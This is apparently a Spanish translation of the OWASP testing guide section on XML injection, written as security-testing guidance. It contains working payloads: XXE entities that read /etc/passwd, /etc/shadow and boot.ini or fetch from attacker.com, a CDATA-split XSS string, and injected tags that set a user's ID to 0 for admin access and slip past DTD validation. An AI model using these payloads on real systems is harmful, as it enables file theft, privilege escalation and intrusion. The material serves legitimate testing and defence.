# Pruebas de Inyección XML

|ID          |
|------------|
|WSTG-INPV-07|

## Resumen

Las pruebas de inyección XML consisten en intentar inyectar un documento XML en la aplicación. Si el analizador XML no valida contextualmente los datos, la prueba dará un resultado positivo.

Esta sección describe ejemplos prácticos de inyección XML. Primero, se definirá una comunicación en estilo XML y se explicarán sus principios de funcionamiento. Luego, el método de descubrimiento en el que se intenta insertar metacaracteres XML. Una vez completado el primer paso, el probador tendrá información sobre la estructura XML, por lo que será posible intentar inyectar datos y etiquetas XML (Inyección de Etiquetas).

## Objetivos de la Prueba

- Identificar puntos de inyección XML.
- Evaluar los tipos de exploits que se pueden lograr y sus severidades.

## Cómo Probar

Supongamos que hay una aplicación web que utiliza una comunicación en estilo XML para realizar el registro de usuarios. Esto se hace creando y agregando un nuevo nodo `user>` en un archivo `xmlDb`.

Supongamos que el archivo xmlDB es como el siguiente:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

Cuando un usuario se registra llenando un formulario HTML, la aplicación recibe los datos del usuario en una solicitud estándar, que, por simplicidad, se supondrá que se envía como una solicitud `GET`.

Por ejemplo, los siguientes valores:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

producirán la solicitud:

`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

La aplicación, entonces, construye el siguiente nodo:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

que se agregará al xmlDB:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### Descubrimiento

El primer paso para probar una aplicación en busca de la presencia de una vulnerabilidad de inyección XML consiste en intentar insertar metacaracteres XML.

Los metacaracteres XML son:

- Comilla simple: `'` - Cuando no se sanitiza, este carácter podría lanzar una excepción durante el análisis XML, si el valor inyectado va a formar parte de un valor de atributo en una etiqueta.

Como ejemplo, supongamos que hay el siguiente atributo:

`<node attrib='$inputValue'/>`

Así que, si:

`inputValue = foo'`

se instancia y luego se inserta como el valor de attrib:

`<node attrib='foo''/>`

entonces, el documento XML resultante no está bien formado.

- Comilla doble: `"` - este carácter tiene el mismo significado que la comilla simple y podría usarse si el valor del atributo está encerrado en comillas dobles.

`<node attrib="$inputValue"/>`

Así que si:

`$inputValue = foo"`

la sustitución da:

`<node attrib="foo""/>`

y el documento XML resultante es inválido.

- Paréntesis angulares: `>` y `<` - Al agregar un paréntesis angular abierto o cerrado en una entrada de usuario como la siguiente:

`Username = foo<`

la aplicación construirá un nuevo nodo:

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

pero, debido a la presencia del '<' abierto, el documento XML resultante es inválido.

- Etiqueta de comentario: `<!--/-->` - Esta secuencia de caracteres se interpreta como el inicio/fin de un comentario. Así que al inyectar uno de ellos en el parámetro Username:

`Username = foo<!--`

la aplicación construirá un nodo como el siguiente:

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

que no será una secuencia XML válida.

- Ampersand: `&`- El ampersand se usa en la sintaxis XML para representar entidades. El formato de una entidad es `&symbol;`. Una entidad se mapea a un carácter en el conjunto de caracteres Unicode.

Por ejemplo:

`<tagnode><</tagnode>`

está bien formado y válido, y representa el carácter ASCII `<`.

Si `&` no se codifica por sí mismo con `&`, podría usarse para probar la inyección XML.

De hecho, si se proporciona una entrada como la siguiente:

`Username = &foo`

se creará un nuevo nodo:

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

pero, nuevamente, el documento no es válido: `&foo` no termina con `;` y la entidad `&foo;` no está definida.

- Delimitadores de sección CDATA: `<!\[CDATA\[ / ]]>` - Las secciones CDATA se usan para escapar bloques de texto que contienen caracteres que de otro modo se reconocerían como marcado. En otras palabras, los caracteres encerrados en una sección CDATA no son analizados por un analizador XML.

Por ejemplo, si hay necesidad de representar la cadena `<foo>` dentro de un nodo de texto, se puede usar una sección CDATA:

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

de modo que `<foo>` no se analice como marcado y se considere como datos de caracteres.

Si un nodo se crea de la siguiente manera:

`<username><![CDATA[<$userName]]></username>`

el probador podría intentar inyectar la cadena final CDATA `]]>` para intentar invalidar el documento XML.

`userName = ]]>`

esto se convertirá en:

`<username><![CDATA[]]>]]></username>`

que no es un fragmento XML válido.

Otra prueba está relacionada con la etiqueta CDATA. Supongamos que el documento XML se procesa para generar una página HTML. En este caso, los delimitadores de sección CDATA pueden eliminarse simplemente, sin inspeccionar más sus contenidos. Entonces, es posible inyectar etiquetas HTML, que se incluirán en la página generada, eludiendo completamente las rutinas de sanitización existentes.

Consideremos un ejemplo concreto. Supongamos que tenemos un nodo que contiene algo de texto que se mostrará de vuelta al usuario.

```xml
<html>
    $HTMLCode
</html>
```

Entonces, un atacante puede proporcionar la siguiente entrada:

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

y obtener el siguiente nodo:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Durante el procesamiento, los delimitadores de sección CDATA se eliminan, generando el siguiente código HTML:

```html
<script>
    alert('XSS')
</script>
```

El resultado es que la aplicación es vulnerable a XSS.

Entidad Externa: El conjunto de entidades válidas puede extenderse definiendo nuevas entidades. Si la definición de una entidad es un URI, la entidad se llama entidad externa. A menos que se configure de otro modo, las entidades externas obligan al analizador XML a acceder al recurso especificado por el URI, por ejemplo, un archivo en la máquina local o en sistemas remotos. Este comportamiento expone la aplicación a ataques de Entidad Externa XML (XXE), que pueden usarse para realizar denegación de servicio del sistema local, obtener acceso no autorizado a archivos en la máquina local, escanear máquinas remotas y realizar denegación de servicio de sistemas remotos.

Para probar vulnerabilidades XXE, se puede usar la siguiente entrada:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

Esta prueba podría bloquear el servidor web (en un sistema UNIX), si el analizador XML intenta sustituir la entidad con el contenido del archivo /dev/random.

Otras pruebas útiles son las siguientes:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### Inyección de Etiquetas

Una vez completado el primer paso, el probador tendrá información sobre la estructura del documento XML. Luego, es posible intentar inyectar datos y etiquetas XML. Mostraremos un ejemplo de cómo esto puede llevar a un ataque de escalada de privilegios.

Considerando la aplicación anterior. Al insertar los siguientes valores:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

la aplicación construirá un nuevo nodo y lo agregará a la base de datos XML:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

El archivo XML resultante está bien formado. Además, es probable que, para el usuario tony, el valor asociado con la etiqueta userid sea el que aparece último, es decir, 0 (el ID de admin). En otras palabras, hemos inyectado un usuario con privilegios administrativos.

El único problema es que la etiqueta userid aparece dos veces en el último nodo de usuario. A menudo, los documentos XML están asociados con un esquema o una DTD y serán rechazados si no cumplen con él.

Supongamos que el documento XML está especificado por la siguiente DTD:

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

Nota que el nodo userid está definido con cardinalidad 1. En este caso, el ataque que hemos mostrado antes (y otros ataques simples) no funcionarán, si el documento XML se valida contra su DTD antes de cualquier procesamiento.

Sin embargo, este problema puede resolverse, si el probador controla el valor de algunos nodos precedentes al nodo ofensivo (userid, en este ejemplo). De hecho, el probador puede comentar tal nodo, inyectando una secuencia de inicio/fin de comentario:

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

En este caso, la base de datos XML final es:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

El nodo `userid` original ha sido comentado, dejando solo el inyectado. El documento ahora cumple con sus reglas DTD.

## Revisión del Código Fuente

Las siguientes API de Java pueden ser vulnerables a XXE si no están configuradas correctamente.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Verifique el código fuente si el docType, DTD externa y entidades de parámetros externas están configurados como usos prohibidos.

- [Hoja de Referencia para Prevención de Entidad Externa XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Además, el lector de oficina Java POI puede ser vulnerable a XXE si la versión es inferior a 3.10.1.

La versión de la biblioteca POI puede identificarse desde el nombre del archivo JAR. Por ejemplo,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

Las siguientes palabras clave de código fuente pueden aplicarse a C.

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## Herramientas

- [Cadenas de Fuzz de Inyección XML (de la herramienta wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## Referencias

- [Inyección XML](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "Ataque XXE (Xml eXternal Entity)"]](https://www.securityfocus.com/archive/1/297714)
- [Hoja de Referencia para Prevención de XXE de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)